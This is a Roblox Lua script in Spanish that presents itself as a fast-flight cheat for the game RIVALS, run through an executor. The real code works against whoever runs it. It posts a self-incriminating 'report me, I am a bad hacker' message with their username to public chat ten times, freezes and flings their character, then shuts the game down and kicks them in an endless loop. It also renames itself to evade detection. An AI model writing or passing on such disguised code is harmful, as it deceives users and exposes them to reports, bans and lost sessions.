-- Script RIVALS - Vuelo SÚPER RÁPIDO + Auto-kick
-- Optimizado para Delta Executor

local startTime = tick()
repeat task.wait() until tick() - startTime >= 3

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local root = character:WaitForChild("HumanoidRootPart")
local humanoid = character:WaitForChild("Humanoid")
local username = player.Name

local flyEnabled = true
local flySpeed = 500
local messagesSent = 0

-- Enviar mensaje 10 veces
local function sendMessageTenTimes()
    if messagesSent >= 10 then return end
    local message = "reporteme soy un hacker malo - " .. username
    
    for i = 1, 10 do
        pcall(function()
            local chatEvent = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
            if chatEvent and chatEvent:FindFirstChild("SayMessageRequest") then
                chatEvent.SayMessageRequest:FireServer(message, "All")
                messagesSent = messagesSent + 1
                return
            end
            
            local textChat = game:GetService("TextChatService")
            local channel = textChat and textChat:FindFirstChild("TextChannels") and textChat.TextChannels:FindFirstChild("RBXGeneral")
            if channel then
                channel:SendAsync(message)
                messagesSent = messagesSent + 1
                return
            end
            
            game:GetService("Chat"):Chat(character, message)
            messagesSent = messagesSent + 1
        end)
        task.wait(0.1)
    end
end

sendMessageTenTimes()

-- Bloqueo total de movimiento
humanoid.WalkSpeed = 0
humanoid.JumpPower = 0
humanoid.AutoRotate = false

-- Vuelo súper rápido
task.spawn(function()
    local directionIndex = 0
    local directions = {
        Vector3.new(1, 1, 0),
        Vector3.new(-1, 1, 0),
        Vector3.new(0, 1, 1),
        Vector3.new(0, 1, -1),
        Vector3.new(1, 1, 1),
        Vector3.new(-1, 1, -1),
        Vector3.new(1, 1, -1),
        Vector3.new(-1, 1, 1),
    }
    
    while flyEnabled and task.wait(0.1) do
        pcall(function()
            if not character or not character.Parent then
                flyEnabled = false
                return
            end
            
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
            
            directionIndex = (directionIndex % #directions) + 1
            local moveDir = directions[directionIndex].Unit * flySpeed * 0.1
            
            root.CFrame = root.CFrame + moveDir
            root.Velocity = Vector3.new(0, 0, 0)
            root.RotVelocity = Vector3.new(0, 0, 0)
        end)
    end
end)

-- Auto-kick después de 10 segundos
task.spawn(function()
    task.wait(10)
    
    pcall(function()
        local screenGui = Instance.new("ScreenGui")
        screenGui.Parent = player:WaitForChild("PlayerGui")
        
        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(1, 0, 1, 0)
        textLabel.Position = UDim2.new(0, 0, 0, 0)
        textLabel.BackgroundTransparency = 1
        textLabel.Text = "no hackers"
        textLabel.TextColor3 = Color3.new(1, 0, 0)
        textLabel.TextSize = 100
        textLabel.TextScaled = true
        textLabel.Font = Enum.Font.GothamBlack
        textLabel.TextStrokeTransparency = 0
        textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
        textLabel.Parent = screenGui
        
        game:GetService("Chat"):Chat(character, "no hackers")
    end)
    
    task.wait(0.5)
    
    pcall(function()
        game:GetService("TeleportService"):Teleport(0)
        game:Shutdown()
    end)
    
    while true do
        pcall(function()
            game:GetService("Players").LocalPlayer:Kick("no hackers")
        end)
        task.wait()
    end
end)

-- Control por teclas
local UserInputService = game:GetService("UserInputService")
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == Enum.KeyCode.F then
        flyEnabled = not flyEnabled
        if not flyEnabled then
            humanoid.WalkSpeed = 16
            humanoid.JumpPower = 50
            humanoid.AutoRotate = true
        else
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
            humanoid.AutoRotate = false
        end
    end
    
    if input.KeyCode == Enum.KeyCode.R then
        flyEnabled = true
        root.CFrame = root.CFrame * CFrame.new(0, 100, 0)
    end
end)

-- Anti-detección
pcall(function()
    script.Name = "UI" .. math.random(1000, 9999)
end)
